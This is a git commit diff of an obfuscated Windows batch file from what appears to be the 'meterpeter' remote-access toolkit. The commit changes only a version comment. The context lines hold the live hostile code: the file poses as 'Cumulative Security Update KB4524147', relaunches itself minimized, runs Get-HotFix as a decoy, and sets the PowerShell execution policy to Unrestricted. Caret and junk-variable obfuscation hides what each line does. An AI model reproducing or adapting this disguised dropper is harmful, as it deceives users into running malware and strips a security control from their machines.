bf98781ac547bf234efec5fd252773ad261c6d45
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2020-05-15 19:21:56 +0100

    Update Update-KB4524147.bat

--- mimiRatz/Update-KB4524147.bat
+++ mimiRatz/Update-KB4524147.bat
@@ -1,5 +1,5 @@
 @echo off
-:: Framework: meterpeter v2.9
+:: Framework: meterpeter v2.10
 ( ,;(=i%@Socket():%f ,no%n_UDP%t ^DE%DB_#1%FIN^ED ,%@k%IS_%Buffer_%MINI%#1%MI%'i'%ZE^D ;se%#0_%t ^IS_MIN^IM%#1_%IZ^ED=1 && @st^a%db%rt "" ^/m%_#1%i^n "%~dpnx0" %* && e%GUID%x^it); ),
 ,Col%ls%or 0E && (,(@tIt%&1%lE ^Cumu%_UUID_%l^ati%#1%v^e Sec%#1%u^ri%_i_%ty Up^dat%'%e KB%Buffer_%4524147 && @Pow%#1%E^rsH^el%Socket():%l Ge^t-Hot%vibes%Fi^x),)
 @cm%Buff#1%d ^/R Ec^h%i0%O A|Pow^er%_GUID_%sh^elL Set-Exec^UtI%'B%onPo^lI%send(i)%cY Unr%db%e^stric^t%OFF%ed -Sc%_i0%o^pe Cur%_%r^ent%LANG%Us^er
